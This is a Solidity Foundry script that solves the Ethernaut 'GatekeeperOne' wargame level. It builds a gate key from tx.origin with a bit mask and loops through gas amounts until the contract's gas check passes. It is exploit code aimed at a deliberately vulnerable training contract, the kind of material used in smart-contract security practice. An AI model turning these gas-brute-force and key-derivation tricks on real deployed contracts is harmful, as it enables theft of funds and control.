// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/13-GatekeeperOne.sol";



contract Exploit is Script {
    address public GatekeeperOneInstance;

    constructor(address _GatekeeperOneInstance) {
        GatekeeperOneInstance = _GatekeeperOneInstance;
    }

    function attack() external returns (bool) {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;


        for (uint256 i = 0; i < 8191; i++) { 
            (bool result,) = GatekeeperOneInstance.call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",gateKey));
            
            console.log("Attempting with gas:", i + 8191 * 3, "Result:", result);

            if (result) {
                break;
            }
        }
    }
}




contract Exp is Script {

    GatekeeperOne public GatekeeperOneInstance = GatekeeperOne(payable(/*获取的实例地址*/));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    //Exploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);

        Exploit exploit = new Exploit(address(GatekeeperOneInstance));
        exploit.attack();
        // (bytes8 gateKey) = Exploit.attack();
        // console.log("GateKey used for attack:", gateKey);
        console.log("Entrant address:", GatekeeperOneInstance.entrant());
        
        vm.stopBroadcast();
    }
}